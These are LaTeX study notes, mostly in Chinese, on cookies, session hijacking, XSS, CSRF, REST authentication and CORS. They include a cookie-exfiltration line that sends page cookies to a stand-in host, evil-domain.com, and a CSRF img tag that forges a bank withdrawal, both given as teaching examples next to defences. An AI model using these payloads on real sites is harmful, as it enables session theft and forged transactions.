\chapter{Web}

\section{Cookies}

http://www.nczonline.net/blog/2009/05/05/http-cookies-explained/

cookie是一个储存在用户机器上的小的text文件,包含的是不可执行的文本。web page或者服务器告诉浏览器保存这些信息,并且在接下来的请求中按一定的规则附带这些信息,服务器可以使用这些信息来区分不同的用户。

web服务器通过HTTP header:Set-Cookie来告诉浏览器保存cookie。
\begin{HTML5}
Set-Cookie: value[; expires=date][; domain=domain][; path=path][; secure]
\end{HTML5}

第一部分value一般来说是一个字符串,他的格式是name=value.

当cookie存在,而规则准许的情况下,cookie会在后面的请求被发送到服务器。

cookie会被保存在HTTP header:Cookie中
\begin{HTML5}
Cookie: value
\end{HTML5}
在Set-Cookie中的option选项是只被浏览器使用,Cookie头中的Value和Set-Cookie中的是一样的字符串。

如果有多个值,他们之间使用分号隔开
\begin{HTML5}
Cookie: value1; value2; name1=value1
\end{HTML5}

每一个选项通过分号和空格隔开。

第一个是expires,说明什么时候cookie不需要再发送给web服务器,并且可能被浏览器删除掉,这个选项的值是一个Date
\begin{HTML5}
Set-Cookie: name=Nicholas; expires=Sat, 02 May 2009 23:38:25 GMT
\end{HTML5}
如果没有定义expires,cookie的生命周期是单个的session。session的结束定义为浏览器关闭。这也是为什么每次登陆都有一个选框问是不是要保存登陆记录。如果expires的时间是一个过去的时间,那么他将被删除掉。

domain选项,指定cookie改发送到哪个domain。默认情况下,domain被设定为当前页面的host name。自己设定的domain只能是设定cookie页面的host name的一部分。

path和domain的功能类似,发送cookie前先要判断path在发送的页面中。

\begin{HTML5}
Set-Cookie: name=Nicholas; path=/blog
\end{HTML5}

最后是secure, 这个没有值。如果有这个选项,则cookie只有在SSL或者是HTTPS的时候才会发送。cookie通过HTTPS设定的时候,自动被加上secure选项。

当cookie设定时,可以使用任意的选项
\begin{HTML5}
Set-Cookie: name=Nicholas; domain=nczonline.net; path=/blog
\end{HTML5}
如果设定的时候这些选项,在重新设定cookie的值得时候,name,domain和path都需要带,而且相同才能设定。
\begin{HTML5}
Set-Cookie: name=Greg; domain=nczonline.net; path=/blog
\end{HTML5}
如果选项值不同,也会创建新的cookie。

当有多个相同名字的cookie被设定是,总是按最匹配的顺序一起发送

比如有
\begin{HTML5}
Set-Cookie: name=Greg; domain=nczonline.net; path=/blog
Set-Cookie: name=Nicholas; domain=nczonline.net; path=/
Set-Cookie: name=Mike
\end{HTML5}

则返回的的是:

\begin{HTML5}
Cookie: name=Mike; name=Greg; name=Nicholas
\end{HTML5}

当要修改expires的时候,name-domain-path-secure必须要都相同的时候,才能够修改。而当修改name的value的时候,则不需要指定expires。

JavaScript中使用document.cookie = ...来设定cookie,...的字符串和Set-Cookie头中应该是一样的。

httpOnly选项是的javascript无法访问当前这个cookie。


\paragraph{session hijacking} session劫持,因为是通过明文传递的。

三个方案来防止session hijacking。
\begin{itemize}

\item 只通过SLL来发送cookie
\item 使用用户信息(用户名,IP,时间戳)或者随即的方式来产生session key,使得很难重用session key
\item 在进行一些安全级别要求较高的操作时,要求重新做验证。
\end{itemize}

\paragraph{Third-Party Cookies} 第三方cookies

\begin{itemize}
\item link tag包含的CSS文件
\item script tag包含的js文件
\item object或者embed tag包含的meida文件
\item iframe tag包含的html文件
\end{itemize}

对于第三方server,可以根据请求头中包含的Referer头来判断这个请求是从哪个site过来的。服务器可以使用一个特定的cookie来表示这个请求页面,如果同一个资源从另外一个页面请求过来,cookie也会随着请求一起发送过来。这样第三方服务器就能够知道访问Site A的用户同时也访问了Site B。这是在线广告使用的一种技术。


\paragraph{Cookie Stealing \& XSS} Cookie偷取 cross-site scripting attack

在同一个页面的所有JavaScript都运行在同一个domain下,有相同的path,和页面相同的协议。这表示从其他domain导入的script可以通过读取document.cookie来获得页面的cookie。

比如说从第三方evil-domain.com导入了一些有用的code,如果在evil-domain.com的家伙将代码换成下面的代码的话。
\begin{JavaScript}
(new Image()).src = "http://www.evil-domain.com/cookiestealer.php?cookie=" + cookie.domain;
\end{JavaScript}
他们就悄悄的取得了我的页面的cookie,这样他们就可以轻松的进行其他攻击,如session hijacking.

当由于导入第三方脚本造成的攻击,我们称为XSS(cross-site scripting attack).

cookie stealing不单只是因为导入了第三方脚本导致,对input缺乏过滤也可能造成cookie stealing。如果输入可以输出到一个页面,而输入中包含了 \lstinline$<script>$标签在其中,也可能导致脚本运行。


\paragraph{CSRF} Cross-site Request Forgery

攻击者让浏览器以登陆的用户做一些有害的操作。

比如说,有人在没有验证输入的论坛上面发布了一条消息。消息内容是
\begin{JavaScript}
<img src="http://bank.example/withdraw?account=bob&amount=1000000&for=mallory">
\end{JavaScript}

当你登陆银行账号之后,访问了这个页面,这个请求会被发送出去,相应的cookie会被带上。这样你就会在不知情的情况下将钱转走。


CSRF很难track,所以阻止是关键。

\begin{itemize}
\item 不要包含不守信用的domian的脚本。
\item 一定要对用户的输入过滤。
\item Require validation not just with cookies, but also by referrer and or request type (POST instead of GET).
\end{itemize}

\begin{itemize}
\item Require confirmation for any sensitive action
\item Cookies that validate users in systems with sensitive data should have a short expiration time.
\end{itemize}

\section{authentication with a REST API}
http://stackoverflow.com/questions/15051712/how-to-do-authentication-with-a-rest-api-right-browser-native-clients

\paragraph{HTTP session Vs. stateless auth token} what's the difference?

HTTP Session:

\begin{enumerate}
\item Client requests a URL (first request to the server)
\item Server gives the normal response plus some unique string (== session ID)
\item Client has to send this string with every request (which is done automatically using HTTP header)
\item Client logs in -> Server memorizes that this particular session ID is now logged in
\item Client visits a page which requires auth -> Nothing special to do, because the session ID will automatically get sent to the server via HTTP header
\end{enumerate}

stateless auth token:

\begin{enumerate}
\item Client request URL (first request to the server)
\item Server just gives the normal response without any key or token or id
\item (nothing special here)
\item Client logs in -> Server creates an auth token and sends this token to the client inside the response
\item Client visits page which requires auth -> Client has to submit the auth token
\end{enumerate}


\section{SSE} Server-Sent Event(服务端推送事件)

\section{CORS} 跨源资源共享(Cross-Origin Resource Sharing)

使用场景:
\begin{itemize}
\item XMLHttpRequest发起跨站HTTP请求
\item Web字体
\item WebGL贴图
\item 使用drawImage API在canvas上画图
\end{itemize}


\subsection{场景}

\subsubsection*{简单请求}

什么是简单请求:
\begin{itemize}
\item 只使用 GET, HEAD 或者 POST 请求方法。如果使用 POST 向服务器端传送数据,则数据类型(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain中的一种。
\item 不会使用自定义请求头(类似于 X-Modified 这种)。
\end{itemize}

从http://foo.example想要访问 http://bar.other的资源

\begin{JavaScript}
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/public-data/';
   
function callOtherDomain() {
  if(invocation) {    
    invocation.open('GET', url, true);
    invocation.onreadystatechange = handler;
    invocation.send(); 
  }
}
\end{JavaScript}

\begin{HTML5}
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61 
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

[XML Data]
\end{HTML5}


\subsubsection{预请求}

预请求必须先发送一个OPTIONS请求给目的站点,来查明这个跨站请求对于目的网站是不是安全可接受的。这么做,是因为跨站请求可能会对目的站点的数据造成破坏。

什么是预请求:
\begin{itemize}
\item 请求以 GET, HEAD 或者 POST 以外的方法发起请求。或者,使用 POST,但请求数据为 application/x-www-form-urlencoded, multipart/form-data 或者 text/plain 以外的数据类型。比如说,用 POST 发送数据类型为 application/xml 或者 text/xml 的 XML 数据的请求。
\item
\end{itemize}


\subsubsection{使得Jersey支持跨域访问}

\begin{itemize}
\item 对于预请求,需要处理Option Method的请求
\item 添加对应的HTTP头
\end{itemize}


\subsubsection{No error information provided to onerror handler}

%在firefox中,使用XMLHttpRequest的onerror,status等于0, 也无法取得error信息。这是规范定义的。这里我的理解之前有点错误,这里的error是指的OPTIONS请求2XX以外的返回,以及后面正真请求的错误(比如没有提供Access-Control-Allow_Origin header)这种错误才不能够取得。

